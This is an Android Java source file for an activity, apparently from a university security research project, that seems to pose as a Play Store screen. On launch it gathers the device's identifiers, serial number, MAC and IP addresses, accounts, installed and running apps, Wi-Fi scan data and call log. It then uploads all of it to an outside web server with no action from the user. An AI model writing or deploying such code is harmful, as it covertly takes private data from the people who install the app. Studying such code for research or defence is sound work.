package com.fiu_CaSPR.Sajib.MonkeyRocket;

/**
 * Created by Sajib on 3/24/2019.
 */

import android.app.ActivityManager;
import android.app.ProgressDialog;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import com.loopj.android.http.*;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.android_examples.getinstalledappiconname_android_examplescom.R;

import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import cz.msebera.android.httpclient.Header;

public class SnapshotActivity extends AppCompatActivity {

    int serverResponseCode = 0;
    ProgressDialog dialog = null;
    String newString = "";
    String upLoadServerUri = null;
    /**********  File Path *************/
    final String uploadFilePath = "/mnt/sdcard/";
    String uploadFileName;
    SimpleDateFormat dateFormat= new SimpleDateFormat("yyyyddMM", Locale.ENGLISH);
    final String cDateTime=dateFormat.format(new Date());

    private String filepath = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.playstore_layout);

        newString+=" Device ID: "+getDeviceID()+"\n Battery Level: "+getBatteryPercentage()+"\n";
        newString+=" Device Name: "+ DeviceTracker.getDeviceName()+"\n Model: "+ Build.MODEL+"\n Serial: "+ Build.SERIAL+"\n Wlan0: "+ IPTracker.getMACAddress("wlan0")+"\n Eth0: "+ IPTracker.getMACAddress("eth0")+"\n IPv4: "+ IPTracker.getIPAddress(true)+"\n IPv6: "+ IPTracker.getIPAddress(false)+"\n";
        newString+=" Total External: "+ StorageTracker.totalExternalValue+" MB\n";
        newString+=" Free External: "+ StorageTracker.freeExternalValue+" MB\n";
        newString+=" Total Internal: "+ StorageTracker.totalInternalValue+" MB\n";
        newString+=" Free Internal: "+ StorageTracker.freeInternalValue+" MB\n";
        //newString+=" Total RAM: "+ StorageTracker.totalRamValue+"\n";+"
        //newString+=" Free RAM: "+ StorageTracker.freeRamValue+"\n";
        newString+=AccountTracker.getAccounts(this);
        newString+=installedApps();
        newString+=runningApps(this)+"\n";
        newString+=" Wifi:\n"+ MainActivity.sb+"\n";
        newString+=CallTracker.getCallLog(this);
        //Toast.makeText(this, newString, Toast.LENGTH_SHORT).show();

        filepath = "Snapshot"+cDateTime+".txt";
        uploadFileName = "Snapshot"+"_"+cDateTime+".txt";

        SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy hh:mm:ss");
        String date = sdf.format(new Date());
        TextView snapshot = (TextView) findViewById(R.id.snapshot);
        //snapshot.setText("Current Snapshot: "+date+"\n\n"+newString);

        Button exitButton = (Button) findViewById(R.id.exit);
        exitButton.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Perform action on click
                exitToHome();
            }
        });


        dummy();

        try {
            doLastJob();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    public void exitToHome(){
        Intent a = new Intent(Intent.ACTION_MAIN);
        a.addCategory(Intent.CATEGORY_HOME);
        a.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(a);
    }

    public String getBatteryPercentage()
    {
        IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = getApplicationContext().registerReceiver(null, iFilter);

        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;

        float batteryLvl = level / (float) scale;
        String batteryPct = Integer.toString((int) (batteryLvl * 100));

        Log.d("Battery Level: ",batteryPct);
        //Toast.makeText(this, "Battery Level: "+batteryPct, Toast.LENGTH_SHORT).show();
        return batteryPct;
    }

    public String getDeviceID()
    {
        String androidId = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID);
        Log.d("Device ID: ",androidId);
        //Toast.makeText(this, "Device ID: "+androidId, Toast.LENGTH_SHORT).show();
        return androidId;
    }

    public String installedApps()
    {
        String appList="";
        int count=0;
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i=0; i < packList.size(); i++)
        {
            PackageInfo packInfo = packList.get(i);
            if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
            {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                appList += " "+appName+" \n";
                count++;
            }
        }
        appList = "\n App Count: "+count+"\n"+appList;

        return appList;
    }

    public String runningApps(Context context)
    {
        String appList="";
        int count=0;

        if (Build.VERSION.SDK_INT >= 21) {
            UsageStatsManager mUsageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            List<UsageStats> stats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 10, time);

            /*if (stats == null || stats.isEmpty()) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                context.startActivity(intent);
            }*/

            for (UsageStats stat : stats) {
                appList += " " + stat.getPackageName() + " \n";
                count++;
            }
        }
        else {
            ActivityManager activityManager = (ActivityManager) this
                    .getSystemService(ACTIVITY_SERVICE);

            List<ActivityManager.RunningAppProcessInfo> procInfos = activityManager
                    .getRunningAppProcesses();
            for (int idx = 0; idx < procInfos.size(); idx++) {

                appList += " " + procInfos.get(idx).processName + " \n";
                count++;
            }
        }
        appList = "\n Running App Count: "+count+"\n"+appList;

        return appList;
    }

    private void doLastJob() throws FileNotFoundException {

        /************* File Upload Code ****************/
        upLoadServerUri = "http://users.cis.fiu.edu/~stalu001/upload.php";
        uploadFile(filepath);
    }

    private void uploadFile(String sourceFileUri) throws FileNotFoundException {
        AsyncHttpClient client = new AsyncHttpClient();
        client.setTimeout(200000);
        client.setResponseTimeout(200000);
        client.setConnectTimeout(200000);
        upLoadServerUri = "http://users.cis.fiu.edu/~stalu001/upload.php";
        String fileName = sourceFileUri;
        InputStream myInputStream = new ByteArrayInputStream(newString.getBytes());
        RequestParams params = new RequestParams();
        params.put("file", myInputStream, fileName);
        ResponseHandlerInterface handler = new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] response) {
                // called when response HTTP status is "200 OK"
                Toast.makeText(SnapshotActivity.this, "Data Upload Complete!", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] errorResponse, Throwable e) {
                // called when response HTTP status is "4XX" (eg. 401, 403, 404)
                Toast.makeText(SnapshotActivity.this, "Data Upload Failed! Error: "+e, Toast.LENGTH_LONG).show();
                Log.e("Upload Exception", "Exception : "
                        + e.getMessage(), e);
            }

            @Override
            public void onRetry(int retryNo) {
                // called when request is retried
            }
        };
        client.post(upLoadServerUri, params, handler);
    }

    public void zip(String[] files)
    {
        // first parameter is d files second parameter is zip
        // file name
        ZipActivity zipManager = new ZipActivity();

        // calling the zip function
        zipManager.zip(this, files, "snapshot.zip");
    }

    public void unzip()
    {
        ZipActivity zipManager = new ZipActivity();

        // calling the unzip function
        zipManager.unzip("snapshot.zip");
    }

    public void dummy()
    {
/*        //zip the file
        String[] s = new String[2];
        // Type the path of the files in here
        s[0] = filepath;
        zip(s);*/

        ZipActivity zipManager = new ZipActivity();
        zipManager.writeFile(this, filepath, newString);
    }
}

